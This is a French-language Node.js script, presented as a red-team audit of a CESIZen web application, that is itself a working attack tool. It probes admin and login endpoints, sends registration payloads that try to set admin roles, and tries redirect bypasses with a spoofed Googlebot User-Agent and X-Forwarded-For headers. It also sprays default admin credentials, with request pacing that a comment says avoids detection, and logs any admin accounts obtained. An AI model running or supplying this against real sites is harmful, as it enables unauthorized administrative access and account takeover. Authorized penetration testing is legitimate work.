#!/usr/bin/env node
/*
 * AUDIT SÉCURITÉ CESIZEN - Script Red Team
 * ----------------------------------------
 * Script spécialisé pour auditer la sécurité d'une instance CESIZen
 * et tenter la création d'un compte administrateur via différentes techniques.
 * 
 * Usage: node audit_cesizen.js <URL_CESIZEN>
 * Exemple: node audit_cesizen.js https://cesizen-collegue.com
 */

import { setTimeout as sleep } from 'node:timers/promises';
import { URL } from 'node:url';

const hasGlobalFetch = typeof fetch === 'function';
let _fetch = hasGlobalFetch ? fetch : null;
if (!_fetch) {
  const { default: nodeFetch } = await import('node-fetch');
  _fetch = nodeFetch;
}

const COLORS = { info: '\x1b[36m', ok: '\x1b[32m', warn: '\x1b[33m', err: '\x1b[31m', bold: '\x1b[1m', reset: '\x1b[0m' };
const log = (msg, type = 'info') => console.log(`${COLORS[type]}${msg}${COLORS.reset}`);

// Configuration
const TARGET_URL = process.argv[2];
if (!TARGET_URL) {
  console.log(`
${COLORS.err}❌ Usage: node audit_cesizen.js <URL>${COLORS.reset}
${COLORS.info}Exemple: node audit_cesizen.js https://cesizen-collegue.com${COLORS.reset}
  `);
  process.exit(1);
}

const BASE = new URL(TARGET_URL).toString().replace(/\/$/, '');
const DELAY = 200; // ms entre requêtes pour éviter la détection

// Résultats de l'audit
const AUDIT_RESULTS = {
  target: BASE,
  timestamp: new Date().toISOString(),
  vulnerabilities: [],
  adminAccounts: [],
  discoveredEndpoints: [],
  exploitationPaths: []
};

// HTTP Client avec timeout
async function http(method, path, opts = {}) {
  const url = path.startsWith('http') ? path : `${BASE}${path}`;
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), opts.timeout ?? 10000);
  
  try {
    const res = await _fetch(url, {
      method,
      signal: controller.signal,
      headers: { 'User-Agent': 'Security-Audit/1.0', ...opts.headers },
      body: opts.body ? JSON.stringify(opts.body) : undefined,
    });
    clearTimeout(timeout);
    return res;
  } catch (e) {
    clearTimeout(timeout);
    return { ok: false, status: 0, error: e.message };
  }
}

// Phase 1: Reconnaissance
async function reconnaissance() {
  log(`\n${COLORS.bold}🔍 PHASE 1: RECONNAISSANCE${COLORS.reset}`);
  log(`🎯 Cible: ${BASE}`);
  
  // Test de connectivité
  const healthRes = await http('GET', '/');
  if (!healthRes.ok || healthRes.status >= 400) {
    log('❌ Application inaccessible', 'err');
    return false;
  }
  log(`✅ Application accessible (${healthRes.status})`, 'ok');
  
  // Découverte des endpoints d'authentification
  const authEndpoints = [
    '/register', '/signup', '/api/register', '/api/signup', '/api/auth/register',
    '/login', '/signin', '/api/login', '/api/signin', '/api/auth/signin',
    '/admin', '/admin/login', '/api/admin', '/dashboard',
    '/api/users', '/api/user/register', '/auth/register'
  ];
  
  log('\n🔎 Découverte des endpoints...');
  for (const endpoint of authEndpoints) {
    const res = await http('GET', endpoint);
    if (res.status !== 404) {
      AUDIT_RESULTS.discoveredEndpoints.push({ path: endpoint, status: res.status, method: 'GET' });
      log(`  📍 ${endpoint} → ${res.status}`, res.status === 200 ? 'ok' : 'info');
    }
    await sleep(DELAY);
  }
  
  return true;
}

// Phase 2: Test de création de comptes
async function testAccountCreation() {
  log(`\n${COLORS.bold}🛠️ PHASE 2: TENTATIVE DE CRÉATION DE COMPTE ADMIN${COLORS.reset}`);
  
  // Endpoints de registration potentiels
  const registerEndpoints = AUDIT_RESULTS.discoveredEndpoints
    .filter(ep => /register|signup/i.test(ep.path))
    .map(ep => ep.path);
  
  if (registerEndpoints.length === 0) {
    registerEndpoints.push('/api/register', '/register', '/signup');
  }
  
  // Payloads pour tenter l'élévation de privilèges
  const adminPayloads = [
    { name: 'Role ADMIN', payload: { email: 'audit@test.com', name: 'Security Audit', password: 'SecurePass123!', role: 'ADMIN' }},
    { name: 'Role admin', payload: { email: 'audit2@test.com', name: 'Security Audit', password: 'SecurePass123!', role: 'admin' }},
    { name: 'isAdmin true', payload: { email: 'audit3@test.com', name: 'Security Audit', password: 'SecurePass123!', isAdmin: true }},
    { name: 'userType administrator', payload: { email: 'audit4@test.com', name: 'Security Audit', password: 'SecurePass123!', userType: 'administrator' }},
    { name: 'privileges admin', payload: { email: 'audit5@test.com', name: 'Security Audit', password: 'SecurePass123!', privileges: ['admin'] }},
    { name: 'access_level admin', payload: { email: 'audit6@test.com', name: 'Security Audit', password: 'SecurePass123!', access_level: 'admin' }}
  ];
  
  for (const endpoint of registerEndpoints) {
    log(`\n🧪 Test sur ${endpoint}:`);
    
    // Test création compte normal d'abord
    const normalAccount = {
      email: `normal${Date.now()}@audit.com`,
      name: 'Normal User',
      password: 'SecurePass123!'
    };
    
    const normalRes = await http('POST', endpoint, {
      headers: { 'Content-Type': 'application/json' },
      body: normalAccount
    });
    
    if (normalRes.status === 200) {
      log(`  ✅ Création compte normal réussie (${normalRes.status})`, 'ok');
      
      // Maintenant test des payloads admin
      for (const { name, payload } of adminPayloads) {
        await sleep(DELAY * 2);
        const adminRes = await http('POST', endpoint, {
          headers: { 'Content-Type': 'application/json' },
          body: payload
        });
        
        if (adminRes.status === 200) {
          AUDIT_RESULTS.vulnerabilities.push({
            type: 'PRIVILEGE_ESCALATION',
            severity: 'CRITICAL',
            endpoint,
            method: 'POST',
            payload: name,
            description: `Création de compte admin possible via ${name}`
          });
          AUDIT_RESULTS.adminAccounts.push({
            email: payload.email,
            password: payload.password,
            method: name,
            endpoint
          });
          log(`  🚨 VULNÉRABILITÉ: ${name} → ${adminRes.status}`, 'err');
        } else if (adminRes.status === 400 || adminRes.status === 422) {
          log(`  ✅ ${name} bloqué → ${adminRes.status}`, 'ok');
        } else {
          log(`  ⚠️ ${name} → ${adminRes.status}`, 'warn');
        }
      }
      
    } else if (normalRes.status === 404) {
      log(`  ❌ Endpoint inexistant`, 'err');
    } else {
      log(`  ⚠️ Création compte échouée → ${normalRes.status}`, 'warn');
    }
  }
}

// Phase 3: Test d'accès direct aux endpoints admin
async function testDirectAdminAccess() {
  log(`\n${COLORS.bold}🔓 PHASE 3: TEST D'ACCÈS ADMIN DIRECT + ANALYSE CONTENU${COLORS.reset}`);
  
  const adminEndpoints = [
    '/admin', '/admin/', '/admin/dashboard', '/admin/users',
    '/api/admin', '/api/admin/users', '/api/admin/tickets',
    '/dashboard', '/dashboard/admin'
  ];
  
  for (const endpoint of adminEndpoints) {
    const res = await http('GET', endpoint);
    
    if (res.status === 200) {
      // Analyser le contenu HTML pour voir s'il y a vraiment accès admin
      const text = await res.text().catch(() => '');
      const hasAdminContent = analyzeAdminContent(text);
      
      if (hasAdminContent.isRealAdmin) {
        AUDIT_RESULTS.vulnerabilities.push({
          type: 'UNAUTHORIZED_ACCESS',
          severity: 'CRITICAL',
          endpoint,
          method: 'GET',
          description: 'Accès admin réel sans authentification',
          details: hasAdminContent.features
        });
        log(`🚨 CRITIQUE: ${endpoint} admin réel accessible → ${res.status}`, 'err');
        log(`  📋 Fonctionnalités détectées: ${hasAdminContent.features.join(', ')}`, 'info');
      } else if (hasAdminContent.hasRedirection) {
        log(`⚠️ ${endpoint} redirigé côté client → ${res.status}`, 'warn');
        log(`  🔄 Redirection détectée: ${hasAdminContent.redirectType}`, 'info');
        
        // Tenter de contourner la redirection
        await attemptRedirectionBypass(endpoint);
      } else {
        log(`✅ ${endpoint} page normale → ${res.status}`, 'ok');
      }
    } else if (res.status === 401 || res.status === 403) {
      log(`✅ ${endpoint} protégé → ${res.status}`, 'ok');
    } else {
      log(`⚠️ ${endpoint} → ${res.status}`, 'info');
    }
    await sleep(DELAY);
  }
}

// Analyser le contenu HTML pour détecter les fonctionnalités admin réelles
function analyzeAdminContent(html) {
  const adminIndicators = [
    // Fonctionnalités admin réelles
    { pattern: /gestion.*utilisateurs/i, feature: 'Gestion utilisateurs' },
    { pattern: /supprimer.*utilisateur/i, feature: 'Suppression utilisateurs' },
    { pattern: /admin.*panel/i, feature: 'Panel administrateur' },
    { pattern: /dashboard.*admin/i, feature: 'Dashboard admin' },
    { pattern: /api.*admin/i, feature: 'API admin' },
    { pattern: /delete.*user/i, feature: 'Suppression compte' },
    { pattern: /manage.*content/i, feature: 'Gestion contenu' },
    
    // Tables d'admin
    { pattern: /<table[^>]*>.*users.*<\/table>/is, feature: 'Table utilisateurs' },
    { pattern: /<table[^>]*>.*admin.*<\/table>/is, feature: 'Table admin' }
  ];
  
  const redirectionIndicators = [
    { pattern: /window\.location\s*=\s*["']\/["']/i, type: 'JavaScript redirect' },
    { pattern: /router\.push\(["']\/["']\)/i, type: 'Next.js router redirect' },
    { pattern: /useRouter.*push.*\//i, type: 'React router redirect' },
    { pattern: /if\s*\(!.*session.*\).*redirect/i, type: 'Session check redirect' },
    { pattern: /useSession.*loading/i, type: 'NextAuth session check' }
  ];
  
  const features = [];
  let isRealAdmin = false;
  
  // Vérifier les indicateurs d'admin réel
  for (const indicator of adminIndicators) {
    if (indicator.pattern.test(html)) {
      features.push(indicator.feature);
      isRealAdmin = true;
    }
  }
  
  // Vérifier les redirections
  let hasRedirection = false;
  let redirectType = null;
  for (const redir of redirectionIndicators) {
    if (redir.pattern.test(html)) {
      hasRedirection = true;
      redirectType = redir.type;
      break;
    }
  }
  
  return {
    isRealAdmin,
    hasRedirection,
    redirectType,
    features,
    htmlSize: html.length
  };
}

// Tentative de contournement de la redirection
async function attemptRedirectionBypass(endpoint) {
  log(`  🎯 Tentative de contournement pour ${endpoint}:`);
  
  // Technique 1: User-Agent bot (certains sites ne redirigent pas les bots)
  const botRes = await http('GET', endpoint, {
    headers: { 'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)' }
  });
  
  if (botRes.status === 200) {
    const botContent = await botRes.text().catch(() => '');
    const botAnalysis = analyzeAdminContent(botContent);
    if (botAnalysis.isRealAdmin) {
      AUDIT_RESULTS.vulnerabilities.push({
        type: 'UNAUTHORIZED_ACCESS_BOT_BYPASS',
        severity: 'CRITICAL',
        endpoint,
        method: 'GET',
        description: 'Accès admin via User-Agent bot',
        bypass: 'Googlebot User-Agent'
      });
      log(`    🚨 SUCCÈS: Accès via User-Agent bot!`, 'err');
      return;
    }
  }
  
  // Technique 2: Headers de bypass
  const bypassHeaders = [
    { 'X-Requested-With': 'XMLHttpRequest' },
    { 'Accept': 'application/json' },
    { 'X-Forwarded-For': '127.0.0.1' },
    { 'X-Real-IP': '127.0.0.1' }
  ];
  
  for (const headers of bypassHeaders) {
    const bypassRes = await http('GET', endpoint, { headers });
    if (bypassRes.status === 200) {
      const bypassContent = await bypassRes.text().catch(() => '');
      const bypassAnalysis = analyzeAdminContent(bypassContent);
      if (bypassAnalysis.isRealAdmin) {
        AUDIT_RESULTS.vulnerabilities.push({
          type: 'UNAUTHORIZED_ACCESS_HEADER_BYPASS',
          severity: 'CRITICAL',
          endpoint,
          method: 'GET',
          description: 'Accès admin via headers de bypass',
          bypass: Object.keys(headers)[0]
        });
        log(`    🚨 SUCCÈS: Accès via ${Object.keys(headers)[0]}!`, 'err');
        return;
      }
    }
    await sleep(DELAY);
  }
  
  log(`    ❌ Aucun contournement réussi`, 'warn');
}

// Phase 4: Test de credentials par défaut
async function testDefaultCredentials() {
  log(`\n${COLORS.bold}🔑 PHASE 4: TEST DE CREDENTIALS PAR DÉFAUT${COLORS.reset}`);
  
  const loginEndpoints = AUDIT_RESULTS.discoveredEndpoints
    .filter(ep => /login|signin/i.test(ep.path))
    .map(ep => ep.path);
    
  if (loginEndpoints.length === 0) {
    loginEndpoints.push('/api/login', '/login', '/signin');
  }
  
  const defaultCreds = [
    { email: 'admin@cesizen.com', password: 'admin123' },
    { email: 'admin@admin.com', password: 'admin' },
    { email: 'administrator@cesizen.com', password: 'password' },
    { email: 'admin', password: 'admin' },
    { email: 'admin@localhost', password: '123456' }
  ];
  
  for (const endpoint of loginEndpoints) {
    log(`\n🧪 Test credentials sur ${endpoint}:`);
    
    for (const creds of defaultCreds) {
      const loginRes = await http('POST', endpoint, {
        headers: { 'Content-Type': 'application/json' },
        body: creds
      });
      
      if (loginRes.status === 200 || loginRes.status === 302) {
        AUDIT_RESULTS.vulnerabilities.push({
          type: 'DEFAULT_CREDENTIALS',
          severity: 'CRITICAL',
          endpoint,
          credentials: creds,
          description: 'Credentials par défaut fonctionnels'
        });
        AUDIT_RESULTS.adminAccounts.push({
          email: creds.email,
          password: creds.password,
          method: 'default_credentials',
          endpoint
        });
        log(`  🚨 SUCCÈS: ${creds.email}:${creds.password}`, 'err');
      } else if (loginRes.status === 401 || loginRes.status === 403) {
        log(`  ✅ ${creds.email} rejeté`, 'ok');
      } else {
        log(`  ⚠️ ${creds.email} → ${loginRes.status}`, 'info');
      }
      await sleep(DELAY);
    }
  }
}

// Rapport final
function generateReport() {
  log(`\n${COLORS.bold}📊 RAPPORT D'AUDIT SÉCURITÉ${COLORS.reset}`);
  console.log('='.repeat(60));
  
  console.log(`🎯 Cible: ${AUDIT_RESULTS.target}`);
  console.log(`📅 Date: ${new Date(AUDIT_RESULTS.timestamp).toLocaleString()}`);
  console.log(`🔍 Endpoints découverts: ${AUDIT_RESULTS.discoveredEndpoints.length}`);
  console.log(`🚨 Vulnérabilités: ${AUDIT_RESULTS.vulnerabilities.length}`);
  console.log(`👤 Comptes admin créés: ${AUDIT_RESULTS.adminAccounts.length}`);
  
  if (AUDIT_RESULTS.vulnerabilities.length > 0) {
    console.log(`\n${COLORS.err}🚨 VULNÉRABILITÉS CRITIQUES:${COLORS.reset}`);
    AUDIT_RESULTS.vulnerabilities.forEach((vuln, i) => {
      console.log(`${i + 1}. [${vuln.severity}] ${vuln.type}`);
      console.log(`   📍 ${vuln.method} ${vuln.endpoint}`);
      console.log(`   📝 ${vuln.description}`);
    });
  }
  
  if (AUDIT_RESULTS.adminAccounts.length > 0) {
    console.log(`\n${COLORS.err}👑 COMPTES ADMINISTRATEUR CRÉÉS:${COLORS.reset}`);
    AUDIT_RESULTS.adminAccounts.forEach((account, i) => {
      console.log(`${i + 1}. Email: ${account.email}`);
      console.log(`   🔑 Mot de passe: ${account.password}`);
      console.log(`   🛠️ Méthode: ${account.method}`);
      console.log(`   📍 Endpoint: ${account.endpoint}`);
    });
  }
  
  if (AUDIT_RESULTS.vulnerabilities.length === 0 && AUDIT_RESULTS.adminAccounts.length === 0) {
    log(`\n✅ Aucune vulnérabilité critique trouvée`, 'ok');
  }
  
  console.log('\n' + '='.repeat(60));
  
  // Sauvegarde du rapport
  const reportFile = `audit_cesizen_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
  console.log(`💾 Rapport sauvegardé: ${reportFile}`);
  
  return AUDIT_RESULTS.vulnerabilities.length > 0;
}

// Orchestration principale
(async () => {
  log(`${COLORS.bold}🛡️ AUDIT SÉCURITÉ CESIZEN - RED TEAM${COLORS.reset}`);
  log('=' * 50);
  
  const isOnline = await reconnaissance();
  if (!isOnline) return;
  
  await sleep(500);
  await testDirectAdminAccess();
  
  await sleep(500);
  await testAccountCreation();
  
  await sleep(500);
  await testDefaultCredentials();
  
  const hasVulnerabilities = generateReport();
  
  if (hasVulnerabilities) {
    log(`\n${COLORS.err}⚠️ DES VULNÉRABILITÉS ONT ÉTÉ TROUVÉES !${COLORS.reset}`);
    log(`${COLORS.warn}Informez votre collègue des failles de sécurité détectées.${COLORS.reset}`);
    process.exit(1);
  } else {
    log(`\n${COLORS.ok}✅ Audit terminé - Application sécurisée${COLORS.reset}`);
    process.exit(0);
  }
})();
